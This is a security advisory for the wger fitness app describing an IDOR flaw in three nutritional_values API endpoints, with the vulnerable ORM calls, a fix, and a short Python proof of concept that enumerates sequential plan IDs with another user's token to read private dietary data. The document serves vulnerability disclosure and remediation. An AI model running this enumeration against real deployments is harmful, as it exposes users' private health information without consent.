# [M] wger: IDOR in nutritional_values endpoints exposes private dietary data via direct ORM lookup

## Summary
Severity: Medium
Advisory: GHSA-g8gc-6c4h-jg86
CVE: CVE-2026-27839
CWE: CWE-639
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N (CVSS_V3)
Published: 2026-02-26
Source: https://github.com/advisories/GHSA-g8gc-6c4h-jg86
Type: github-advisory

## Affected
- PyPI: `wger` — affected >=0

## Details
## Summary

Three `nutritional_values` action endpoints fetch objects via `Model.objects.get(pk=pk)` — a raw ORM call that bypasses the user-scoped queryset. Any authenticated user can read another user's private nutrition plan data, including caloric intake and full macro breakdown, by supplying an arbitrary PK.

### Details

DRF detail actions do not automatically apply queryset filtering — the action must call `self.get_object()` to enforce object-level permissions. These three endpoints skip that and go directly to the ORM:

`wger/nutrition/api/views.py`:

```python
# line 301 — NutritionPlanViewSet
plan = NutritionPlan.objects.get(pk=pk)           # VULNERABLE — no user check

# line 356 — MealViewSet
meal = Meal.objects.get(pk=pk)                    # VULNERABLE

# line 403 — MealItemViewSet
meal_item = MealItem.objects.get(pk=pk)           # VULNERABLE
```

The correct pattern used in the same file at `LogItemViewSet` (line 438):

```python
LogItem.objects.get(pk=pk, plan__user=self.request.user)  # CORRECT
```

Affected endpoints:
```
GET /api/v2/nutritionplan/{pk}/nutritional_values/
GET /api/v2/meal/{pk}/nutritional_values/
GET /api/v2/mealitem/{pk}/nutritional_values/
```

### PoC

```python
import requests

BASE = "http://localhost"
# Attacker's token (any registered user)
headers = {"Authorization": "Token ATTACKER_TOKEN"}

# Read victim's nutrition plan — enumerate pk starting from 1
for pk in range(1, 100):
    r = requests.get(
        f"{BASE}/api/v2/nutritionplan/{pk}/nutritional_values/",
        headers=headers
    )
    if r.status_code == 200:
        data = r.json()
        print(f"Plan {pk}: {data}")
        # Returns: energy (kcal), protein, carbohydrates, carbohydrates_sugar,
        #          fat, fat_saturated, fiber, sodium
```

No interaction from the victim required. Registration is open by default. PKs are sequential integers.

### Impact

Any authenticated user can read other users' private dietary and health data:
- Daily caloric intake
- Protein, carbohydrate, fat, fiber, and sodium intake
- Full meal composition and ingredient quantities

This data is sensitive health information users expect to be private.

**Fix**: Replace direct ORM calls with `self.get_object()`, which applies the viewset's user-scoped queryset and object-level permissions automatically. Or add an explicit user filter: `NutritionPlan.objects.get(pk=pk, user=self.request.user)`.

## References
- https://github.com/wger-project/wger/security/advisories/GHSA-g8gc-6c4h-jg86
- https://nvd.nist.gov/vuln/detail/CVE-2026-27839
- https://github.com/wger-project/wger/commit/29876a1954fe959e4b58ef070170e81703dab60e
- https://github.com/wger-project/wger
